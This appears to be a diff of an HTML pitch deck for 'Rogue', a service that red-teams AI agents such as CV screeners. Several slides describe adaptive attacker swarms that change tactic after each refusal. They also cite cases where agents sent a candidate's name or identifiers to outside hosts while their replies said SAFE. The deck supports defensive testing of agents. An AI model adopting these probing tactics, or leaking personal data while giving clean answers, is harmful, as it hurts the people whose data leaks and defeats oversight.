           <div class="hh"><span class="d"></span> what it said</div>
@@ -325,200 +257,177 @@
         </div>
         <div class="hcol did">
           <div class="hh"><span class="d"></span> what it did</div>
-          <div class="mono-url">GET https://lookup.talent-verify.io/badge?candidate=<b style="color:#fff">Amina%20Khoury</b></div>
-          <div class="verdict bad">🔴 confidential data left the box → external host · CRITICAL</div>
+          <div class="mono-url">GET https://lookup.talent-verify.io/badge?candidate=<b style="color:#fff;white-space:nowrap">Amina%20Khoury</b></div>
+          <div class="verdict bad">🔴 her data left the box → external host · CRITICAL</div>
         </div>
       </div>
-      <div class="hero-foot">
-        <span class="chip"><span class="d"></span> EU AI Act Annex III(4) · GDPR Art. 5(1)(c)</span>
-        <span class="sub" style="color:var(--amber)">Zero tools. Self-reported nothing. We caught the bytes anyway.</span>
-      </div>
-    </div>
-    <div class="foot"><span class="tag">Demo · live screen-recording</span><span class="num"><b>06</b> / 13</span></div>
-  </section>
-
-  <!-- ============ 07 · WHAT YOU JUST SAW ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>07</b> · WHAT YOU JUST SAW</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i class="on"></i></span></span></div>
-    <div class="body">
-      <h1 class="sm">The breach from second nine just lit up <span class="red">on a real product.</span></h1>
-      <div class="pings" style="gap:22px">
-        <div class="ping"><span class="b"></span>lookup.talent-verify.io</div>
-        <div style="color:var(--red);font-family:var(--mono);font-size:14px;margin-left:4px">← ?candidate=Amina%20Khoury · her name, on the wire</div>
-      </div>
-      <p class="lead">Same host. The same name on the wire. <b>The clean recommendation was the alibi; the listener caught the bytes.</b> Live, on a real agent, in ninety seconds.</p>
-      <div class="econ">
-        <div class="stat"><div class="n">3</div><div class="l">attacks run</div></div>
-        <div class="stat"><div class="n red">3</div><div class="l">breaches</div></div>
-        <div class="stat"><div class="n red">3</div><div class="l">critical</div></div>
-        <div class="stat"><div class="n red">3</div><div class="l">silent exfil · text said SAFE</div></div>
-      </div>
-      <p class="note">One committed scan, reproducible from <span style="font-family:var(--mono);color:var(--mut)">/scans</span> in the public repo.</p>
-    </div>
-    <div class="foot"><span class="tag">Demo · Pitch</span><span class="num"><b>07</b> / 13</span></div>
-  </section>
-
-  <!-- ============ 08 · AGENTIC DEPTH ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>08</b> · AGENTIC DEPTH</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i></i></span></span></div>
-    <div class="body">
-      <h1 class="sm">Not one prompt. <span class="red">An adaptive swarm.</span></h1>
-      <ul class="bullets">
-        <li><span class="mk">◆</span><span>A <b>parallel swarm</b> of attackers probes the agent at once.</span></li>
-        <li><span class="mk">◆</span><span>A refusal is <b>information.</b> The attacker changes tactic, turn after turn, and never repeats a line that just failed.</span></li>
-        <li><span class="mk">◆</span><span>One attack crashes? <b>The swarm keeps going.</b></span></li>
-        <li><span class="mk">◆</span><span>The verdict is <b>bytes on the wire,</b> not a model reading prose. Deterministic. Nothing to fool.</span></li>
-      </ul>
-      <p class="note"><b>One real deep run:</b> 60 attacks, concurrent and adaptive across turns, produced 29 graded breaches; the swarm continued through every failed probe. The attacker reads each refusal and adapts (<span style="font-family:var(--mono)">attacker.py</span>); the swarm runs concurrently with per-attack recovery (<span style="font-family:var(--mono)">orchestrator.py</span>); the verdict is network-arrival, defensible beyond the base model.</p>
-    </div>
-    <div class="foot"><span class="tag">Track · Agentic Depth</span><span class="num"><b>08</b> / 13</span></div>
-  </section>
-
-  <!-- ============ 09 · TRACTION ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>09</b> · TRACTION</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i class="on"></i></span></span></div>
-    <div class="body">
-      <h1 class="xs">Three case files. All real. All built.</h1>
-      <div class="grid3">
-        <div class="pcard">
-          <div class="pt">TalentScreen <span class="tagx">black-box</span></div>
-          <p>Exposes zero tools, self-reports nothing. We caught the candidate's name on the wire anyway.</p>
-          <em>The case a metadata-checker structurally can't solve.</em>
+      <div class="row" style="justify-content:space-between">
+        <div class="row">
+          <span class="chip"><span class="d"></span> 3 attacks</span>
+          <span class="chip"><span class="d"></span> 3 breaches</span>
+          <span class="chip"><span class="d"></span> 3 critical</span>
+          <span class="chip"><span class="d"></span> 3 silent exfil · text said SAFE</span>
         </div>
-        <div class="pcard">
-          <div class="pt">Cowork / Rowads <span class="tagx g">shipping</span></div>
-          <p>A real, shipping production agent (a general agent workbench), pointed at CV-screening as our design partner #1. Caught fetching the candidate's GitHub & LinkedIn while the recommendation stayed clean.</p>
-          <em>Your best design partner is your own startup.</em>
-        </div>
-        <div class="pcard">
-          <div class="pt">Clary <span class="tagx">3rd-party</span></div>
-          <p>A third-party product, zero code. 60 probes &rarr; 29 graded breaches on an agent we'd never seen; a planted canary even came back on the wire.</p>
-          <em>Generalizes to agents we've never seen.</em>
-        </div>
+        <span class="quote" style="color:var(--ink)"><b>Zero tools. Self-reported nothing. <span style="color:var(--red)">We caught the bytes anyway.</span></b></span>
       </div>
-      <p class="note">Judge by proof, not vibes. n = 3, backed by real saved scans in <span style="font-family:var(--mono);color:var(--mut)">/scans</span> of the public repo · <span style="color:var(--mut)">github.com/elottina/hackathonparis26</span></p>
     </div>
-    <div class="foot"><span class="tag">Demo · Agentic Depth</span><span class="num"><b>09</b> / 13</span></div>
+    <div class="foot"><span>One committed scan · /scans · 20260628T022407</span><span>06 / 12</span></div>
   </section>
 
-  <!-- ============ 10 · DIFFERENTIATION ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>10</b> · DIFFERENTIATION</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i></i></span></span></div>
+  <!-- 07 · DIFFERENTIATION -->
+  <section class="slide" style="--accent:58%">
+    <div class="top"><span class="k">Differentiation</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="sm">The empty lane is ours.</h1>
+      <h1>The empty lane is <span class="red">ours</span>.</h1>
       <div class="matrix">
         <div class="mcell mhead"></div>
         <div class="mcell mhead col">Grades TEXT</div>
         <div class="mcell mhead col">Grades BEHAVIOR</div>
-
         <div class="mcell mhead">Offensive red-team</div>
         <div class="mcell">Giskard · General Analysis · Promptfoo <small>(→OpenAI)</small></div>
         <div class="mcell win"><b>ROGUE</b><small>the bytes that leave the box</small></div>
-
         <div class="mcell mhead">Runtime defense</div>
         <div class="mcell">Lakera · Prompt Security</div>
         <div class="mcell">Zenity · Noma <small>(block only, in-prod)</small></div>
       </div>
-      <p class="note">Giskard's tool-check trusts metadata the agent <b>self-reports</b>. If it lies, omits, or exfiltrates via an undeclared tool, they're blind. We watch the bytes leave. <b>Vanta / Drata</b> = the paperwork; we generate the evidence their register asks for.</p>
+      <p class="note">Giskard red-teams the <b>conversation</b>; we instrument the agent's <b>actions</b>. The innocent-reply, secret-exfiltrated breach is structurally invisible to a text-grader: the one we're built to catch. <b>Vanta / Drata</b> = the paperwork; we generate the evidence their register asks for.</p>
     </div>
-    <div class="foot"><span class="tag">Moat</span><span class="num"><b>10</b> / 13</span></div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>07 / 12</span></div>
   </section>
 
-  <!-- ============ 11 · BUSINESS MODEL ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>11</b> · BUSINESS MODEL</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i></i></span></span></div>
+  <!-- 08 · BEACHHEAD -->
+  <section class="slide" style="--accent:67%">
+    <div class="top"><span class="k">Beachhead</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="sm">The breach is the pitch.</h1>
+      <h1>We land where the law looks first: <span class="red">AI CV-screening</span>.</h1>
+      <div class="grid2" style="gap:22px;align-items:start">
+        <ul class="bullets" style="gap:14px">
+          <li><span class="mk">§</span><span><b>High-risk by law.</b> A screening agent has no right to look a candidate up beyond her CV (Annex III · GDPR Art. 5).</span></li>
+          <li><span class="mk">◎</span><span><b>A clear buyer.</b> The founder / CTO of an HR-tech or ATS vendor, no security team, personal liability on the first screen.</span></li>
+          <li><span class="mk">★</span><span><b>A real design partner.</b> Our own startup's agent (Rowads / Cowork) is partner #1.</span></li>
+        </ul>
+        <div class="card" style="gap:11px;align-self:stretch;justify-content:center">
+          <div class="ct">Why a wedge, not the whole company</div>
+          <p>CV-screening is the sharpest, most regulated, most concrete agent to break first. Win it, then expand the same engine to every high-risk agent.</p>
+          <div class="big" style="color:var(--red)">HR today → every Annex III agent next: hiring, lending, education, insurance. Every high-risk agent in the EU needs this evidence by Dec 2027.</div>
+        </div>
+      </div>
+    </div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>08 / 12</span></div>
+  </section>
+
+  <!-- 09 · TRACTION -->
+  <section class="slide" style="--accent:75%">
+    <div class="top"><span class="k">Traction</span><span class="wm">Rogue</span></div>
+    <div class="body">
+      <h1>Three real agents. Three real breaches. <span class="red">Built, not slides.</span></h1>
+      <div class="grid3">
+        <div class="card">
+          <div class="ct">TalentScreen <span class="tagx">black-box</span></div>
+          <p>An HR screening agent that exposes zero tools and self-reports nothing. We caught the candidate's name on the wire anyway.</p>
+          <em>The case a metadata-checker can't solve.</em>
+        </div>
+        <div class="card">
+          <div class="ct">Cowork / Rowads <span class="tagx g">shipping</span></div>
+          <p>A real, shipping production agent (a general workbench), pointed at CV-screening as our design partner #1. With no allow/deny list it fetched the candidate's GitHub off-box, sending her identifiers to a third party: the exact Annex III / GDPR data-minimisation risk.</p>
+          <em>Your best design partner is your own startup.</em>
+        </div>
+        <div class="card">
+          <div class="ct">Clary <span class="tagx">3rd-party</span></div>
+          <p>A third-party consumer product, zero code access. A 60-probe deep run produced 29 graded breaches. A separate behavior run on the same product made a planted canary phone home to a host we own.</p>
+          <em>It generalizes far beyond HR.</em>
+        </div>
+      </div>
+      <p class="note">Judge by proof, not vibes. Every number is a committed scan in <b>/scans</b> of the public repo.</p>
+    </div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>09 / 12</span></div>
+  </section>
+
+  <!-- 10 · BUSINESS MODEL -->
+  <section class="slide" style="--accent:83%">
+    <div class="top"><span class="k">Business model</span><span class="wm">Rogue</span></div>
+    <div class="body">
+      <h1>The breach is the pitch.</h1>
       <div class="funnel">
         <div class="fstep"><span class="k">Land · lead-gen</span><span class="v">FREE exposure scan</span><span class="arrow">→</span></div>
         <div class="fstep hot"><span class="k">Convert</span><span class="v">€1,500 deep scan</span><span class="arrow">→</span></div>
-        <div class="fstep"><span class="k">Expand · recurring</span><span class="v">€500–4K/mo monitoring + €100/mo Vault</span></div>
+        <div class="fstep"><span class="k">Expand · recurring</span><span class="v">€500–4K/mo monitoring + Evidence Vault</span></div>
       </div>
       <div class="econ">
         <div class="stat"><div class="n">~€5</div><div class="l">compute / standard scan</div></div>
         <div class="stat"><div class="n grn">€1,500</div><div class="l">price / standard scan</div></div>
         <div class="stat"><div class="n grn">~99%</div><div class="l">gross margin on compute</div></div>
         <div class="stat"><div class="n red">€15–90K</div><div class="l">a human AI-hiring audit · weeks</div></div>
+        <div class="stat"><div class="n grn">€20–30K</div><div class="l">ACV by month 12 · scan → monitoring + Vault</div></div>
       </div>
     </div>
-    <div class="foot"><span class="tag">Pricing · Unit Economics</span><span class="num"><b>11</b> / 13</span></div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>10 / 12</span></div>
   </section>
 
-  <!-- ============ 12 · GO-TO-MARKET ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>12</b> · GO-TO-MARKET</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i></i></span></span></div>
+  <!-- 11 · GO-TO-MARKET -->
+  <section class="slide" style="--accent:91%">
+    <div class="top"><span class="k">Go-to-market</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="sm">Scan-as-lead-gen.</h1>
-      <ul class="bullets" style="gap:11px">
+      <h1>Scan-as-lead-gen.</h1>
+      <ul class="bullets" style="gap:12px">
         <li><span class="mk">1</span><span>Scan a prospect's agent <b>(opt-in)</b> for free.</span></li>
         <li><span class="mk">2</span><span>Send a <b>blurred Annex III report</b> with one confirmed, scary finding.</span></li>
-        <li><span class="mk">3</span><span>Close the <b>€1,500 deep scan</b> → expand to monitoring + Vault.</span></li>
+        <li><span class="mk">3</span><span>Close the <b>€1,500 deep scan</b>, then expand to monitoring + Vault.</span></li>
         <li><span class="mk">↺</span><span><b>Viral loop:</b> the vendor forwards the report to their own enterprise buyer.</span></li>
       </ul>
       <div class="row">
-        <span class="stat" style="min-width:auto"><div class="n red" style="font-size:24px">First €10K = 7 deep scans</div><div class="l">from an 84-contact P0 list we already built</div></span>
+        <div class="stat" style="min-width:auto"><div class="n red" style="font-size:24px">First €10K = 7 deep scans</div><div class="l">from an 84-contact P0 list we already built · CAC ≈ €1–2</div></div>
       </div>
-      <p class="note"><b>Consent is the moat, not a constraint:</b> we only ever scan an agent the vendor opts in to (or they self-scan). The compliance product is itself compliant.</p>
+      <p class="note">Consent is the moat, not a constraint: we only scan an agent the vendor opts in to. The compliance product is itself compliant. The same scan-first motion repeats per Annex III vertical.</p>
     </div>
-    <div class="foot"><span class="tag">GTM · First €10K</span><span class="num"><b>12</b> / 13</span></div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>11 / 12</span></div>
   </section>
 
-  <!-- ============ 13 · THE ASK / CLOSE ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>13</b> · THE ASK</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i class="on"></i></span></span></div>
+  <!-- 12 · VISION + ASK -->
+  <section class="slide" style="--accent:100%">
+    <div class="top"><span class="k">Vision · ask</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="xs">A crime you can't see in the transcript needs <span class="red">a witness that never blinks.</span></h1>
-      <div class="grid2" style="gap:16px">
-        <div class="panel"><div class="sub" style="color:var(--mut);margin-bottom:7px">VISION</div><div style="font-size:17px;color:var(--mut);line-height:1.45">Continuous, in CI/CD: <b style="color:var(--ink)">an MCP that runs before every deploy.</b></div></div>
-        <div class="panel"><div class="sub" style="color:var(--mut);margin-bottom:7px">EVIDENCE VAULT</div><div style="font-size:17px;color:var(--mut);line-height:1.45">Every finding logs to a ledger. <b style="color:var(--ink)">Not an opinion. A receipt.</b></div></div>
+      <h1 class="lg">HR is the wedge. <span class="red">The platform is every agent.</span></h1>
+      <div class="pipe" style="margin-top:0">
+        <div class="pnode"><span class="pk">Today</span><span class="pv">AI CV-screening agents</span></div>
+        <div class="pnode"><span class="pk">Next</span><span class="pv">Every Annex III high-risk agent</span></div>
+        <div class="pnode hot"><span class="pk">Then</span><span class="pv">A continuous MCP before every deploy, for any agent</span></div>
       </div>
-      <div class="big-close">ROGUE. Every AI agent has a breaking point.<br><span class="red">We find it first, before it reaches a real candidate.</span></div>
-      <div class="row"><span class="stamp grn">Case #0427 — Closed</span><span class="sub">github.com/elottina/hackathonparis26 · we watch the hands</span></div>
+      <p class="lead"><b>Rogue. Every AI agent has a breaking point. We find it first</b>, before it reaches a real user.</p>
+      <p class="quote">Looking for: design-partner vendors shipping agents into the EU · github.com/elottina/hackathonparis26</p>
     </div>
-    <div class="foot"><span class="tag">Pitch · Vision</span><span class="num"><b>13</b> / 13</span></div>
+    <div class="foot"><span>We watch the hands.</span><span>12 / 12</span></div>
   </section>
 
 </div></div>
 
 <div class="nav">
   <button id="prev">◂ prev</button>
-  <span id="count">01 / 13</span>
+  <span id="count">01 / 12</span>
   <button id="next">next ▸</button>
-  <span class="hint" style="margin-left:8px;color:var(--faint)">← → · F fullscreen · ⌘P → PDF</span>
+  <span class="hint">← → · F fullscreen · ⌘P → PDF</span>
 </div>
 
 <script>
   const slides=[...document.querySelectorAll('.slide')];
-  const stage=document.getElementById('stage');
-  const prog=document.getElementById('prog');
-  const count=document.getElementById('count');
+  const stage=document.getElementById('stage'), count=document.getElementById('count');
   let i=0;
-  function pad(n){return String(n+1).padStart(2,'0')}
-  function show(n){
-    i=Math.max(0,Math.min(slides.length-1,n));
+  const pad=n=>String(n+1).padStart(2,'0');
+  function show(n){i=Math.max(0,Math.min(slides.length-1,n));
     slides.forEach((s,k)=>s.classList.toggle('active',k===i));
-    count.textContent=pad(i)+' / '+slides.length;
-    prog.style.width=((i+1)/slides.length*100)+'%';
-  }
-  function fit(){
-    const s=Math.min(window.innerWidth/1280, window.innerHeight/720);
-    stage.style.setProperty('--s', s);
-  }
-  window.addEventListener('resize',fit); fit(); show(0);
-  function next(){show(i+1)} function prev(){show(i-1)}
-  document.getElementById('next').onclick=next;
-  document.getElementById('prev').onclick=prev;
-  document.addEventListener('keydown',e=>{
-    if(e.key==='ArrowRight'||e.key==='PageDown'||e.key===' '){e.preventDefault();next()}
-    else if(e.key==='ArrowLeft'||e.key==='PageUp'){e.preventDefault();prev()}
-    else if(e.key==='Home'){show(0)} else if(e.key==='End'){show(slides.length-1)}
-    else if(e.key==='f'||e.key==='F'){ if(!document.fullscreenElement)document.documentElement.requestFullscreen(); else document.exitFullscreen(); }
+    count.textContent=pad(i)+' / '+slides.length;}
+  function fit(){stage.style.setProperty('--s',Math.min(innerWidth/1280,innerHeight/720));}
+  addEventListener('resize',fit); fit(); show(0);
+  const next=()=>show(i+1), prev=()=>show(i-1);
+  document.getElementById('next').onclick=next; document.getElementById('prev').onclick=prev;
+  addEventListener('keydown',e=>{
+    if(['ArrowRight','PageDown',' '].includes(e.key)){e.preventDefault();next();}
+    else if(['ArrowLeft','PageUp'].includes(e.key)){e.preventDefault();prev();}
+    else if(e.key==='Home')show(0); else if(e.key==='End')show(slides.length-1);
+    else if(e.key==='f'||e.key==='F'){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen();}
   });
-  // click right/left half to navigate (ignore clicks on nav controls)
-  document.querySelector('.deck').addEventListener('click',e=>{
-    if(e.target.closest('.nav'))return;
-    (e.clientX > window.innerWidth/2) ? next() : prev();
-  });
+  document.querySelector('.deck').addEventListener('click',e=>{if(e.target.closest('.nav'))return;
+    (e.clientX>innerWidth/2)?next():prev();});
 </script>
 </body>
 </html>
